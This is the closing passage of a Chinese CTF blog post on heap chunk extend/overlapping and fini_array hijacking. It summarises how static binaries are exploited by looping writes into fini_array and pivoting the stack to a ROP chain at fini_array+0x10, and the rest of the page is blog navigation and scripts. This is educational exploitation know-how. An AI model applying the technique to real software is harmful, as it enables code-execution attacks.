<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png"></p>
<p>或者 IDA <code>ctrl+s</code> 找 .fini_array 分段 ：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png"></p>
<p>64 位中只有 fini_array[0] ，没有 fini_array[1] ，也就是只能运行写入 fini_array 一次，然后就正常退出了。无法像静态编译那样重复调用。</p>
<h6 id="静态动态利用方式小结"><a href="#静态动态利用方式小结" class="headerlink" title="静态动态利用方式小结"></a>静态动态利用方式小结</h6><p>动态程序目前就遇到 <code>2015 hacklu bookstore</code> 这一题，太菜了总结不出规律。</p>
<p>静态程序基本上套路是劫持 fini_array + 循环写入，将 ROP 链布置到 fini_array + 0x10 ，写入完成后将栈迁移到 fini_array + 0x10 执行 ROP 链。静态程序的总结可以看看<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/226003.html">淇淇师傅文章</a>。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SkYe231</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mrskye.cn/archives/d269f0ac/">https://www.mrskye.cn/archives/d269f0ac/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mrskye.cn" target="_blank">SkYe231 Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/fini-array/">fini_array</a><a class="post-meta__tags" href="/tags/chunk-extend/">chunk extend</a><a class="post-meta__tags" href="/tags/chunk-overlapping/">chunk overlapping</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/4c7d7bc8/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Z3库-多元方程一把梭哈</div></div></a></div><div class="next-post pull-right"><a href="/archives/fcb705b7/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Buu刷题记录</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/2a024eda/" title="劫持64位静态程序fini_array进行ROP攻击"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover1.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-04-06</div><div class="title">劫持64位静态程序fini_array进行ROP攻击</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">SkYe231</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">145</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:skye231@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.mrskye.cn/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?uin=910437231" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">请修改默认公告</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E6%8B%93%E5%B1%95-amp-%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">堆拓展&amp;溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-1%EF%BC%9A%E5%AF%B9-inuse-%E7%9A%84-fastbin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-number">1.3.</span> <span class="toc-text">基本示例 1：对 inuse 的 fastbin 进行 extend</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">注解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-2%EF%BC%9A%E5%AF%B9-inuse-%E7%9A%84-smallbin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-number">1.4.</span> <span class="toc-text">基本示例 2：对 inuse 的 smallbin 进行 extend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-3%EF%BC%9A%E5%AF%B9-free-%E7%9A%84-smallbin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-number">1.5.</span> <span class="toc-text">基本示例 3：对 free 的 smallbin 进行 extend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chunk-Extend-Shrink-%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">1.6.</span> <span class="toc-text">Chunk Extend&#x2F;Shrink 可以做什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-4%EF%BC%9A%E9%80%9A%E8%BF%87-extend-%E5%90%8E%E5%90%91-overlapping"><span class="toc-number">1.7.</span> <span class="toc-text">基本示例 4：通过 extend 后向 overlapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-5%EF%BC%9A%E9%80%9A%E8%BF%87-extend-%E5%89%8D%E5%90%91-overlapping"><span class="toc-number">1.8.</span> <span class="toc-text">基本示例 5：通过 extend 前向 overlapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-Trainging-lab13"><span class="toc-number">1.9.</span> <span class="toc-text">HITCON Trainging lab13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.9.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD"><span class="toc-number">1.9.2.</span> <span class="toc-text">基本功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">1.9.3.</span> <span class="toc-text">漏洞函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.9.4.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.9.5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.9.6.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2015-hacklu-bookstore"><span class="toc-number">1.10.</span> <span class="toc-text">2015 hacklu bookstore</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-1"><span class="toc-number">1.10.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD-1"><span class="toc-number">1.10.2.</span> <span class="toc-text">基本功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0-1"><span class="toc-number">1.10.3.</span> <span class="toc-text">漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">堆溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAF"><span class="toc-number">1.10.3.2.</span> <span class="toc-text">UAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.10.3.3.</span> <span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E8%BE%93%E5%85%A5%E9%95%BF%E5%BA%A6"><span class="toc-number">1.10.3.4.</span> <span class="toc-text">奇怪的输入长度</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.10.4.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%85%E5%AE%B9"><span class="toc-number">1.10.4.1.</span> <span class="toc-text">控制格式化字符串内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-fini-array"><span class="toc-number">1.10.4.2.</span> <span class="toc-text">劫持 fini_array</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Way-1"><span class="toc-number">1.10.4.2.1.</span> <span class="toc-text">Way 1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Way-2"><span class="toc-number">1.10.4.2.2.</span> <span class="toc-text">Way 2</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-main-%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">1.10.4.3.</span> <span class="toc-text">修改 main 函数返回地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.10.5.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.10.6.</span> <span class="toc-text">参考文章</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.7.</span> <span class="toc-text">补充总结</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE-fini-array-%EF%BC%9F"><span class="toc-number">1.10.7.0.1.</span> <span class="toc-text">怎么找 fini_array ？</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#64-%E4%BD%8D%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.10.7.0.1.1.</span> <span class="toc-text">64 位静态链接程序</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#64-%E4%BD%8D%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.10.7.0.1.2.</span> <span class="toc-text">64 位动态链接程序</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%8A%A8%E6%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93"><span class="toc-number">1.10.7.0.1.3.</span> <span class="toc-text">静态动态利用方式小结</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/d4cc29fc/" title="d4cc29fc"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="d4cc29fc"/></a><div class="content"><a class="title" href="/archives/d4cc29fc/" title="d4cc29fc">d4cc29fc</a><time datetime="2021-05-21T05:30:55.436Z" title="更新于 2021-05-21 13:30:55">2021-05-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f4b801d2/" title="2021 ISCC 信息安全与对抗技术竞赛Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 ISCC 信息安全与对抗技术竞赛Writeup"/></a><div class="content"><a class="title" href="/archives/f4b801d2/" title="2021 ISCC 信息安全与对抗技术竞赛Writeup">2021 ISCC 信息安全与对抗技术竞赛Writeup</a><time datetime="2021-05-17T09:49:35.032Z" title="更新于 2021-05-17 17:49:35">2021-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/55a7d556/" title="第十四届全国大学生信息安全竞赛线上初赛Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第十四届全国大学生信息安全竞赛线上初赛Writeup"/></a><div class="content"><a class="title" href="/archives/55a7d556/" title="第十四届全国大学生信息安全竞赛线上初赛Writeup">第十四届全国大学生信息安全竞赛线上初赛Writeup</a><time datetime="2021-05-16T08:42:58.374Z" title="更新于 2021-05-16 16:42:58">2021-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/44c34994/" title="第四届红帽杯线上赛Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210514000902.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第四届红帽杯线上赛Writeup"/></a><div class="content"><a class="title" href="/archives/44c34994/" title="第四届红帽杯线上赛Writeup">第四届红帽杯线上赛Writeup</a><time datetime="2021-05-16T08:01:47.026Z" title="更新于 2021-05-16 16:01:47">2021-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/a24f3497/" title="2021津门杯Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021津门杯Writeup"/></a><div class="content"><a class="title" href="/archives/a24f3497/" title="2021津门杯Writeup">2021津门杯Writeup</a><time datetime="2021-05-12T15:50:44.311Z" title="更新于 2021-05-12 23:50:44">2021-05-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_cover5.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By SkYe231</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://cloud.tencent.com/product/wh?from=12331" target="_blank">Hosted BY 云开发 Cloudbase</a>&nbsp;|&nbsp;<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-07-01-lGwrnPz3GuV4odmM.png" align="top" style="width:48px"></a><br /><div class="github-badge"><a rel="license" href="http://beian.miit.gov.cn/" target="_blank" title="粤ICP备20056619号"><span class="badge-subject">粤ICP备</span><span class="badge-value bg-black">20056619号</span></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>